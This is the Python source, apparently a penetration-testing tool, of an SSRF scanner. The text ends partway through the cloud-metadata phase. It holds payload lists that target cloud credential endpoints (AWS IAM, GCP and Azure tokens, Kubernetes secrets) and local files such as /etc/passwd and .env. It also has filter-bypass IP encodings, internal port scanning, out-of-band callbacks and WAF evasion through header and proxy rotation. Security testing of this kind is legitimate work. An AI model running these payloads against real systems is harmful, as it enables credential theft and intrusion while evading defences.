#!/usr/bin/env python3
"""
auditing_tools/ssrf_finder.py — Server-Side Request Forgery Auditor (v4.0)
═══════════════════════════════════════════════════════════════════════════════

Military-grade SSRF detection with WAF evasion, chain aggregation, and
confirmed-only output.

SAFETY MODEL
────────────
Every target request flows through `EvasionSession`:
  • Jittered pacing
  • User-Agent + X-Forwarded-For rotation
  • Optional proxy rotation
  • Exponential back-off on 403/406/429/503
  • 60-second cool-down after a WAF block page

Protocol-abuse (gopher/dict) probes are gated behind `--aggressive` — the
default is `false` because they can actually poke live internal services.

CONFIRMATION MODEL
──────────────────
  OOB:      Manual mode → HIGH (pending); Interactsh mode → CRITICAL on callback.
  Metadata: Marker match minus preexisting markers → confirmed.
            IMDSv2 token flow includes X-aws-ec2-metadata-token follow-up.
  File:     File-content markers → confirmed.
  Internal: Service banner match → confirmed. Status-only signal → candidate.
  Port:     Timing delta only → candidate (MEDIUM).
  Bypass:   Only counts when the raw payload failed — else it's redundant.

SEVERITY (impact-driven)
────────────────────────
  CRITICAL   Credential exposure (AccessKeyId/SecretAccessKey/IAM token/
             service-account token/private key). File read confirmed.
             OOB callback confirmed. Protocol abuse with data returned.
  HIGH       Cloud metadata without credentials. Internal service banner.
             SSRF filter bypass confirmed. Manual-mode OOB (pending).
  MEDIUM     Port-scan timing signal. Status delta on internal port.
             OOB probe sent (manual mode).
  LOW        Surface candidate only.
  INFO       Denied / param ignored / network error.

CHAINS
──────
  ssrf-cloud-credentials  IAM/cloud credential exposure
  ssrf-file-read          arbitrary file read
  ssrf-oob-blind          confirmed blind SSRF via callback
  ssrf-metadata           metadata exposure without credentials
  ssrf-internal-service   internal service access
  ssrf-bypass             SSRF filter bypass demonstrated
  ssrf-port-scan          internal network mapping
  ssrf-k8s-token          Kubernetes service-account token access

OUTPUTS
───────
  ssrf_findings.json      every finding
  ssrf_confirmed.json     HIGH / CRITICAL only
  ssrf_chains.json        structured chain records
  ssrf_candidates.txt     flat triage
  ssrf_confirmed.txt      confirmed flat triage
  ssrf_oob.txt            OOB-specific subset
  ssrf_evidence/          raw baseline + probe bodies per confirmed finding
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import select
import shutil
import string
import statistics
import subprocess
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.ssrf_finder")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    return getattr(CFG, key, default) if CFG_LOADED else default


def _ssrf_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("ssrf", {}) or {}
    return {
        "rate_limit":   entry.get("rate_limit", 3),
        "concurrency":  entry.get("concurrency", 3),
        "timeout":      entry.get("timeout", 12),
        "max_surfaces": entry.get("max_surfaces", 300),
        "jitter":       entry.get("jitter", 0.4),
        "proxies":      entry.get("proxies", []),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        h.update(getattr(CFG, "AUTH_HEADERS", {}) or {})
    return h


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  SEVERITY
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

    @property
    def rank(self) -> int:
        return {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[self.value]


# ═════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION
# ═════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: dict[str, dict] = {
    "Cloudflare":  {"headers": ["cf-ray", "__cf_bm"], "body": ["Attention Required! | Cloudflare"]},
    "Akamai":      {"headers": ["akamai-grn", "x-akamai-transformed"], "body": ["Access Denied"]},
    "Imperva":     {"headers": ["x-iinfo", "incap_ses"], "body": ["Pardon Our Interruption"]},
    "AWS WAF":     {"headers": ["x-amzn-requestid"], "body": ["Request blocked"]},
    "F5 BIG-IP":   {"headers": ["x-wa-info", "bigipserver"], "body": ["The requested URL was rejected"]},
    "Sucuri":      {"headers": ["x-sucuri-id"], "body": ["Sucuri WebSite Firewall"]},
    "DataDome":    {"headers": ["x-datadome"], "body": ["captcha-delivery"]},
    "ModSecurity": {"headers": ["x-mod-security"], "body": ["ModSecurity"]},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]


@dataclass
class WAFReport:
    vendor: str = "unknown"
    confidence: int = 0
    signals: list[str] = field(default_factory=list)
    blocked: bool = False


def detect_waf(session: "Session", url: str) -> WAFReport:
    report = WAFReport()
    try:
        resp = session.request("GET", url)
    except Exception:
        return report
    if resp is None:
        return report
    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
    body_blob = _body(resp)[:4000].lower()
    for vendor, sig in WAF_SIGNATURES.items():
        hits = [f"header:{h}" for h in sig["headers"] if h.lower() in header_blob]
        hits += [f"body:{b[:40]}" for b in sig["body"] if b.lower() in body_blob]
        if hits:
            report.vendor = vendor
            report.signals = hits
            report.confidence = min(100, 50 + 15 * len(hits))
            break
    if resp.status_code in (403, 406, 429, 503):
        low = _body(resp)[:2000].lower()
        if any(w in low for w in ("blocked", "denied", "firewall", "captcha")):
            report.blocked = True
            if report.vendor == "unknown":
                report.vendor = "generic-waf"
                report.confidence = 40
    return report


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT           = 12
BASELINE_SAMPLES          = 2
INTERACTSH_STARTUP_WAIT   = 10.0
OOB_CORRELATION_WAIT      = 15.0
OOB_CORRELATION_AGGRESSIVE = 45.0
PORT_SCAN_TIMING_DELTA    = 1.5
MAX_PORT_SCAN_TARGETS     = 8
REQUEST_SLEEP             = 0.1
MAX_URLS                  = 5000

SSRF_PARAMS = {
    "url", "uri", "path", "dest", "destination", "redirect", "redirect_uri",
    "redirect_url", "redirect_to", "return", "return_url", "returnTo",
    "next", "continue", "forward", "target", "to", "out", "view",
    "dir", "show", "file", "document", "folder", "page", "feed", "site",
    "html", "val", "domain", "callback", "callback_url", "data", "reference",
    "img", "img_url", "image", "image_url", "src", "source", "link",
    "open", "window", "proxy", "fetch", "load", "request", "resource",
    "endpoint", "host", "port", "u", "r", "goto", "jump", "action",
    "checkout", "login", "logout", "service", "webhook", "webhook_url",
    "avatar", "avatar_url", "picture", "picture_url", "thumbnail",
    "import", "import_url", "export", "export_url", "pdf", "pdf_url",
    "screenshot", "screenshot_url", "preview", "preview_url",
    "rss", "rss_url", "xml", "xml_url", "json", "json_url",
    "api", "api_url", "backend", "origin", "source_url", "target_url",
}

SSRF_HEADERS = [
    "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP", "X-Originating-IP",
    "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "X-Host",
    "X-Forwarded-Server", "Referer", "Origin",
    "X-Custom-IP-Authorization", "Forwarded", "True-Client-IP",
    "CF-Connecting-IP", "X-ProxyUser-Ip", "Client-IP",
]

CLOUD_METADATA = {
    "aws_imdsv1": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "alibaba":  ["http://100.100.100.200/latest/meta-data/"],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1.json",
    ],
    "oracle": ["http://169.254.169.254/opc/v1/instance/"],
    "kubernetes": [
        "https://kubernetes.default.svc/api/v1/secrets",
        "http://127.0.0.1:6443/api/v1/secrets",
        "http://localhost:10255/pods",
    ],
}

# Metadata markers — split by what they imply
CREDENTIAL_MARKERS = [
    "AccessKeyId", "SecretAccessKey", "SessionToken", "security-credentials",
    "service-accounts", "private_key", "BEGIN RSA PRIVATE KEY",
    "BEGIN OPENSSH PRIVATE KEY", "refresh_token", "id_token",
    "client_secret",
]
METADATA_MARKERS = [
    "ami-id", "instance-id", "instance-type", "security-credentials",
    "AccessKeyId", "SecretAccessKey", "computeMetadata",
    "Metadata-Flavor", "service-accounts", "project-id",
    "subscriptionId", "vmId", "resourceGroupName", "opc/v1",
    "droplet_id", "metadata/v1", "kube-system", "kubernetes.io",
]

FILE_READ_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///app/.env",
    "file:///var/www/html/.env",
    "file:///c:/windows/win.ini",
    "file:///c:/windows/system32/drivers/etc/hosts",
    # Bypass variants
    "file:////etc/passwd",
    "file:///./etc/passwd",
    "file://localhost/etc/passwd",
    "FILE:///etc/passwd",
    "file:/etc/passwd",
]

FILE_MARKERS = [
    "root:x:0:0", "root:*:0:0", "daemon:", "/bin/bash", "/bin/sh",
    "[extensions]", "[fonts]", "for 16-bit app support",
    "APP_ENV", "DB_PASSWORD", "SECRET_KEY",
]

SERVICE_BANNERS = {
    "redis":      ["redis_version", "-ERR unknown command", "+PONG", "-NOAUTH"],
    "memcached":  ["ERROR", "STAT version", "CLIENT_ERROR"],
    "elasticsearch": ["You Know, for Search", "cluster_name", "lucene_version"],
    "jenkins":    ["Jenkins", "X-Jenkins", "Dashboard [Jenkins]"],
    "grafana":    ["Grafana", "grafana-app"],
    "consul":     ["Consul Agent", "consul"],
    "docker":     ["Docker", "Api-Version", "Docker-Distribution-Api-Version"],
    "kubernetes": ["kube-system", "apiVersion", '"kind": "Status"'],
    "tomcat":     ["Apache Tomcat", "Tomcat Manager"],
    "mysql":      ["mysql_native_password", "MariaDB", "MySQL"],
    "postgres":   ["PostgreSQL", "FATAL:  password authentication failed"],
    "etcd":       ["etcdserver", "etcdcluster"],
}

DENIAL_MARKERS = (
    "not allowed", "blocked", "forbidden", "invalid url", "invalid uri",
    "not a valid url", "not permitted", "disallowed", "not permitted",
    "url rejected", "request rejected",
)

SCAN_PORTS = [22, 80, 443, 3000, 3306, 5000, 5432, 6379, 8080,
              8443, 8500, 9200, 9300, 11211, 27017, 2375, 6443]
SCAN_PORTS_AGGRESSIVE = SCAN_PORTS + [
    21, 25, 53, 110, 143, 465, 587, 993, 995, 1433, 1521, 2049,
    2181, 2379, 2380, 5601, 6380, 7001, 7002, 8000, 8009, 8081,
    8088, 8090, 8161, 8500, 8983, 9000, 9042, 9090, 9300, 9418,
    10250, 10255, 10256, 15672, 27018,
]

LOOPBACK_IP = "127.0.0.1"
METADATA_IP = "169.254.169.254"

# Encoding variants — v4 adds chains, decimal-no-leading-zero, complex chains
IP_ENCODING_VARIANTS = {
    LOOPBACK_IP: [
        "127.1", "127.0.1", "0.0.0.0", "0",
        "2130706433", "0x7f000001", "0x7F000001", "0X7F000001",
        "0x7f.0x0.0x0.0x1", "0x7f.0x0.0x0.0x1",
        "0177.0.0.1", "017700000001",
        "[::1]", "[::ffff:127.0.0.1]", "[::ffff:7f00:1]",
        "[0:0:0:0:0:ffff:7f00:1]", "[::FFFF:7F00:1]",
        "127.0.0.1.nip.io", "127.0.0.1.sslip.io", "localtest.me",
        "127.0.0.1.", "127.0.0.1\x00",
        # Chains
        "127.0.0.1:80@target.com",
        "target.com@127.0.0.1",
        "127.0.0.1%09",
        "127.0.0.1%00.target.com",
    ],
    METADATA_IP: [
        "2852039166", "0xa9fea9fe", "0xA9FEA9FE", "0XA9FEA9FE",
        "0251.0376.0251.0376",
        "[::ffff:169.254.169.254]", "[::ffff:a9fe:a9fe]",
        "[0:0:0:0:0:ffff:a9fe:a9fe]", "[::FFFF:A9FE:A9FE]",
        "169.254.169.254.nip.io", "169.254.169.254.sslip.io",
    ],
}

PARSER_CONFUSION = [
    lambda u: u.replace("://", "://target.com@"),
    lambda u: u + "#@target.com",
    lambda u: u.replace("://", "://target.com\\@"),
    lambda u: u.replace("://", "://target.com%00@"),
    lambda u: u.replace("://", "://target.com%2f@"),
    lambda u: u.replace("://", "://target.com%09@"),
]


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class Baseline:
    url: str
    param: str
    location: str = "query"
    status: int = 0
    length: int = 0
    body: str = ""
    content_type: str = ""
    median_time: float = 0.0
    time_stddev: float = 0.0
    preexisting_markers: set[str] = field(default_factory=set)

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "location": self.location,
            "status": self.status, "length": self.length,
            "median_time": round(self.median_time, 3),
            "time_stddev": round(self.time_stddev, 3),
            "preexisting_markers": sorted(self.preexisting_markers),
        }


@dataclass
class SSRFinding:
    target: str
    param: str
    technique: str
    severity: Severity = Severity.MEDIUM
    confidence: int = 50
    confirmed: bool = False
    oob_confirmed: bool = False
    payload: str = ""
    evidence: str = ""
    bypass_used: str = ""
    oob_token: str = ""
    param_location: str = "query"
    http_status: int = 0
    chain_ids: list[str] = field(default_factory=list)
    waf_vendor: str = ""
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        return hashlib.sha256(f"{self.target}|{self.param}|{self.technique}".encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "target":         self.target,
            "target_host":    self.target_host,
            "param_name":     self.param,
            "param_location": self.param_location,
            "technique":      self.technique,
            "severity":       self.severity.value,
            "confidence":     self.confidence,
            "confirmed":      self.confirmed,
            "oob_confirmed":  self.oob_confirmed,
            "payload":        (self.payload or "")[:2048],
            "evidence":       (self.evidence or "")[:1024],
            "bypass_used":    self.bypass_used,
            "oob_token":      self.oob_token,
            "http_status":    self.http_status,
            "chain_ids":      self.chain_ids,
            "waf_vendor":     self.waf_vendor,
            "details":        self.details,
            "auth_enabled":   self.auth_enabled,
            "finding_hash":   self.finding_hash,
            "first_seen":     self.first_seen or _db_now(),
        }


@dataclass
class SSRFChain:
    chain_id: str
    name: str
    severity: Severity
    steps: list[str]
    finding_hashes: list[str] = field(default_factory=list)
    evidence: str = ""

    def to_dict(self) -> dict:
        return {
            "chain_id":       self.chain_id,
            "name":           self.name,
            "severity":       self.severity.value,
            "steps":          self.steps,
            "finding_hashes": self.finding_hashes,
            "evidence":       self.evidence[:600],
        }


# ═════════════════════════════════════════════════════════════════════════════
#  SHARED RATE LIMITER + SESSION
# ═════════════════════════════════════════════════════════════════════════════

class SharedRateLimiter:
    def __init__(self, rate_limit: float, jitter: float = 0.0):
        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
        self.jitter = max(0.0, jitter)
        self._last = 0.0
        self._lock = threading.Lock()

    def wait(self) -> None:
        if self.min_interval <= 0 and self.jitter <= 0:
            return
        with self._lock:
            interval = self.min_interval + random.uniform(0, self.jitter)
            elapsed = time.monotonic() - self._last
            if elapsed < interval:
                time.sleep(interval - elapsed)
            self._last = time.monotonic()


class Session:
    def __init__(
        self, limiter: SharedRateLimiter, headers: dict, timeout: int,
        proxies: Optional[list[str]] = None,
    ):
        self.session = requests.Session()
        self.session.verify = False
        if headers:
            self.session.headers.update(headers)
        self.session.headers.setdefault("User-Agent", USER_AGENTS[0])
        self._limiter = limiter
        self.timeout = timeout
        self.proxies = proxies or []
        self._proxy_idx = 0
        self._ua_idx = 0
        self._backoff = 0.0
        self._cooldown_until = 0.0
        self._lock = threading.Lock()

    def _rotate(self) -> Optional[dict]:
        with self._lock:
            if self.proxies:
                p = self.proxies[self._proxy_idx % len(self.proxies)]
                self._proxy_idx += 1
                proxy = {"http": p, "https": p}
            else:
                proxy = None
            self.session.headers["User-Agent"] = USER_AGENTS[self._ua_idx % len(USER_AGENTS)]
            self._ua_idx += 1
        return proxy

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        now = time.monotonic()
        if now < self._cooldown_until:
            time.sleep(self._cooldown_until - now)
        self._limiter.wait()
        if self._backoff > 0:
            time.sleep(self._backoff)
        proxy = self._rotate()

        try:
            resp = self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False, proxies=proxy,
                **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

        if resp.status_code in (403, 406, 429, 503):
            self._backoff = min(30.0, max(1.0, self._backoff * 2 or 1.0))
            low = _body(resp)[:2000].lower()
            if any(w in low for w in ("blocked", "firewall", "captcha", "denied")):
                self._cooldown_until = time.monotonic() + 60.0
                log.warning("  WAF block — cooling down 60s")
        elif resp.status_code < 400:
            self._backoff = 0.0
        return resp

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls, seen = [], set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        tok = line.split()[0]
        if not tok.startswith(("http://", "https://")):
            tok = "https://" + tok
        if tok not in seen:
            seen.add(tok)
            urls.append(tok)
    return urls


def _body(resp: Optional[requests.Response], limit: int = 200_000) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _match_markers(body: str, markers: list[str]) -> list[str]:
    if not body:
        return []
    low = body.lower()
    return [m for m in markers if m.lower() in low]


def _looks_denied(resp: Optional[requests.Response]) -> bool:
    # v4 fix: network error is NOT a denial (was True in v3, losing findings)
    if resp is None:
        return False
    if 200 <= resp.status_code < 300:
        body_low = _body(resp).lower()[:2000]
        return any(m in body_low for m in DENIAL_MARKERS)
    return False


def _inject_query(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe=":/?=&%"))
    )


def _severity_for(
    technique: str, markers: list[str], provider: str = "",
) -> tuple[Severity, int, str]:
    """Return (severity, confidence, rationale) from confirmed technique + markers."""
    creds = set(markers) & set(CREDENTIAL_MARKERS)
    if creds:
        return (Severity.CRITICAL, 95, f"Credential exposure: {', '.join(sorted(creds))}")
    if technique == "file_read":
        return (Severity.CRITICAL, 95, f"File read: {', '.join(markers[:3])}")
    if technique == "oob":
        return (Severity.CRITICAL, 95, "Out-of-band callback confirmed")
    if technique == "metadata":
        return (Severity.HIGH, 90, f"{provider} metadata exposure (no credentials)")
    if technique == "internal":
        return (Severity.HIGH, 85, f"Internal service access: {', '.join(markers[:3])}")
    if "bypass" in technique:
        return (Severity.HIGH, 85, "SSRF filter bypass confirmed")
    if technique == "port_scan":
        return (Severity.MEDIUM, 55, "Internal port scan signal")
    return (Severity.MEDIUM, 50, "Possible SSRF")


def _chain_ids_for(f: SSRFinding) -> list[str]:
    if not f.confirmed:
        return []
    ids: list[str] = []
    evidence_l = f.evidence.lower()
    if any(k in evidence_l for k in ("accesskeyid", "secretaccesskey",
                                     "sessiontoken", "service-accounts",
                                     "private key", "refresh_token")):
        ids.append("ssrf-cloud-credentials")
    if f.technique == "file_read":
        ids.append("ssrf-file-read")
    if f.technique == "oob":
        ids.append("ssrf-oob-blind")
    if f.technique == "metadata" and "ssrf-cloud-credentials" not in ids:
        ids.append("ssrf-metadata")
    if f.technique == "internal":
        ids.append("ssrf-internal-service")
    if "bypass" in f.technique or f.bypass_used:
        ids.append("ssrf-bypass")
    if f.technique == "port_scan":
        ids.append("ssrf-port-scan")
    if "kubernetes" in evidence_l or "k8s" in evidence_l:
        ids.append("ssrf-k8s-token")
    return list(dict.fromkeys(ids))


def build_chains(findings: list[SSRFinding]) -> list[SSRFChain]:
    chains: dict[str, list[SSRFinding]] = {}
    NAMES = {
        "ssrf-cloud-credentials": "SSRF → cloud credential exposure",
        "ssrf-file-read":         "SSRF → arbitrary file read",
        "ssrf-oob-blind":         "SSRF → confirmed blind SSRF",
        "ssrf-metadata":          "SSRF → metadata exposure (no credentials)",
        "ssrf-internal-service":  "SSRF → internal service access",
        "ssrf-bypass":            "SSRF → filter bypass demonstrated",
        "ssrf-port-scan":         "SSRF → internal network mapping",
        "ssrf-k8s-token":         "SSRF → Kubernetes service-account token",
    }
    for f in findings:
        for cid in (_chain_ids_for(f) or f.chain_ids):
            chains.setdefault(cid, []).append(f)
            if cid not in f.chain_ids:
                f.chain_ids.append(cid)
    out: list[SSRFChain] = []
    for cid, fs in chains.items():
        max_sev = max(fs, key=lambda x: x.severity.rank).severity
        out.append(SSRFChain(
            chain_id=cid, name=NAMES.get(cid, cid), severity=max_sev,
            steps=[x.evidence for x in fs],
            finding_hashes=[x.finding_hash for x in fs],
            evidence=fs[0].evidence if fs else "",
        ))
    return out


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def discover_query_surfaces(urls: list[str]) -> list[dict]:
    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        for pname, _ in urllib.parse.parse_qs(parsed.query).items():
            if pname.lower() in SSRF_PARAMS:
                key = (url.split("?")[0], pname)
                if key in seen:
                    continue
                seen.add(key)
                surfaces.append({
                    "url": url, "param": pname,
                    "location": "query", "method": "GET",
                })
    return surfaces


def discover_body_surfaces(outdir: Path) -> list[dict]:
    pages_file = outdir / "site_pages.json"
    if not pages_file.exists():
        return []
    try:
        data = json.loads(pages_file.read_text())
    except Exception:
        return []

    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for page in data.get("pages") or []:
        page_url = page.get("url") or ""
        for form in page.get("forms") or []:
            if (form.get("method") or "").upper() != "POST":
                continue
            action = form.get("action") or page_url
            for field_def in form.get("fields") or []:
                fname = (field_def.get("name") or "").lower()
                if fname in SSRF_PARAMS:
                    key = (action, fname)
                    if key in seen:
                        continue
                    seen.add(key)
                    surfaces.append({
                        "url": action, "param": field_def.get("name"),
                        "location": "body", "method": "POST",
                    })
    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  OOB CAPTURE
# ═════════════════════════════════════════════════════════════════════════════

class OOBCapture:
    def __init__(self, domain: Optional[str] = None, use_interactsh: bool = False):
        self.user_domain = domain
        self.use_interactsh = use_interactsh
        self.domain: Optional[str] = domain
        self.proc: Optional[subprocess.Popen] = None
        self.reader_thread: Optional[threading.Thread] = None
        self.interactions: list[dict] = []
        self.interaction_ids: set[str] = set()
        self.lock = threading.Lock()

    def start(self) -> bool:
        if self.user_domain:
            self.domain = self.user_domain
            log.info(f"    OOB domain : {self.domain} (manual verification)")
            return True
        if not self.use_interactsh:
            log.info("    OOB        : disabled")
            return False
        if not shutil.which("interactsh-client"):
            log.warning("    OOB        : interactsh-client not installed")
            return False
        try:
            self.proc = subprocess.Popen(
                ["interactsh-client", "-json"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, bufsize=1,
            )
        except Exception as e:
            log.warning(f"    OOB        : interactsh-client failed: {e}")
            return False
        domain = self._read_banner(INTERACTSH_STARTUP_WAIT)
        if not domain:
            log.warning("    OOB        : could not parse interactsh domain")
            self.stop()
            return False
        self.domain = domain
        log.info(f"    OOB domain : {domain}")
        self.reader_thread = threading.Thread(target=self._read_interactions, daemon=True)
        self.reader_thread.start()
        return True

    def _read_banner(self, timeout: float) -> Optional[str]:
        if not self.proc or not self.proc.stderr:
            return None
        # v4: relaxed regex — some interactsh installations use shorter labels
        pattern = re.compile(
            r"([a-z0-9]{10,}\.(?:oast\.(?:fun|site|pro|online|live|me)|interact\.sh))",
            re.I,
        )
        deadline = time.monotonic() + timeout
        collected = ""
        while time.monotonic() < deadline:
            r, _, _ = select.select([self.proc.stderr], [], [], 0.5)
            if not r:
                continue
            line = self.proc.stderr.readline()
            if not line:
                break
            collected += line
            m = pattern.search(collected)
            if m:
                return m.group(1)
        return None

    def _read_interactions(self) -> None:
        if not self.proc or not self.proc.stdout:
            return
        for line in self.proc.stdout:
            line = line.strip()
            if not line or not line.startswith("{"):
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            with self.lock:
                self.interactions.append(obj)
                for key in ("full-id", "unique-id", "full_id", "unique_id"):
                    v = obj.get(key)
                    if v:
                        self.interaction_ids.add(str(v).lower())

    def new_token(self, prefix: str = "argus") -> str:
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        return f"{prefix}{suffix}"

    def token_url(self, token: str, scheme: str = "http") -> Optional[str]:
        if not self.domain:
            return None
        return f"{scheme}://{token}.{self.domain}/"

    def check(self, token: str) -> bool:
        with self.lock:
            t = token.lower()
            return any(t in i for i in self.interaction_ids)

    def wait_and_check(self, tokens: list[str], wait: float) -> set[str]:
        if not tokens or not self.use_interactsh:
            return set()
        deadline = time.monotonic() + wait
        fired: set[str] = set()
        while time.monotonic() < deadline:
            for tok in tokens:
                if tok not in fired and self.check(tok):
                    fired.add(tok)
            if len(fired) == len(tokens):
                break
            time.sleep(0.5)
        return fired

    def stop(self) -> None:
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=3)
            except Exception:
                try:
                    self.proc.kill()
                except Exception:
                    pass


# ═════════════════════════════════════════════════════════════════════════════
#  BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(
    session: Session, url: str, param: str, location: str, method: str,
    body_data: Optional[dict] = None,
) -> Baseline:
    baseline = Baseline(url=url, param=param, location=location)
    times: list[float] = []
    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        if location == "body":
            resp = session.request(method, url, data=body_data or {})
        else:
            resp = session.get(url)
        times.append(time.monotonic() - start)
        if resp and not baseline.status:
            baseline.status = resp.status_code
            baseline.body = _body(resp)
            baseline.length = len(baseline.body)
            baseline.content_type = resp.headers.get("Content-Type", "")
            baseline.preexisting_markers = set(
                _match_markers(baseline.body, METADATA_MARKERS + FILE_MARKERS)
            )
        time.sleep(REQUEST_SLEEP)
    if times:
        baseline.median_time = statistics.median(times)
        if len(times) > 1:
            baseline.time_stddev = statistics.pstdev(times)
    return baseline


def _probe(
    session: Session, surface: dict, payload: str,
) -> Optional[requests.Response]:
    url, param = surface["url"], surface["param"]
    location = surface["location"]
    method = surface.get("method", "GET")
    if location == "query":
        return session.get(_inject_query(url, param, payload))
    if location == "body":
        return session.request(method, url, data={param: payload})
    return None


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — OOB
# ═════════════════════════════════════════════════════════════════════════════

def test_oob(
    session: Session, oob: OOBCapture, surface: dict, baseline: Baseline,
) -> list[SSRFinding]:
    if not oob.domain:
        return []
    token = oob.new_token()
    last_payload = ""
    sent = False
    for scheme in ("http", "https"):
        oob_url = oob.token_url(token, scheme)
        if not oob_url:
            continue
        resp = _probe(session, surface, oob_url)
        last_payload = oob_url
        if resp is not None:
            sent = True
    if not sent:
        return []
    mode = "interactsh" if oob.use_interactsh else "manual"
    return [SSRFinding(
        target=surface["url"], param=surface["param"],
        param_location=surface["location"],
        technique="oob", severity=Severity.HIGH, confidence=60,
        confirmed=False, oob_confirmed=False,
        payload=last_payload, oob_token=token,
        evidence=f"OOB probe sent to {token}.{oob.domain} — awaiting callback ({mode})",
        details={"mode": mode},
    )]


def confirm_oob_batch(
    oob: OOBCapture, findings: list[SSRFinding], wait: float,
) -> list[SSRFinding]:
    if not oob.use_interactsh:
        return findings
    tokens = [f.oob_token for f in findings if f.oob_token]
    if not tokens:
        return findings
    log.info(f"    Waiting {wait:.0f}s for OOB callbacks...")
    fired = oob.wait_and_check(tokens, wait)
    for f in findings:
        if f.oob_token in fired:
            f.severity = Severity.CRITICAL
            f.confidence = 95
            f.confirmed = True
            f.oob_confirmed = True
            f.evidence = f"Out-of-band callback confirmed for token {f.oob_token}"
            f.details["oob_confirmed"] = True
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — CLOUD METADATA (with IMDSv2 two-step)
# ═════════════════════════════════════════════════════════════════════════════

def test_cloud_metadata(
    session: Session, surface: dict, baseline: Baseline,
) -> list[SSRFinding]:
    for provider, endpoints in CLOUD_METADATA.items():
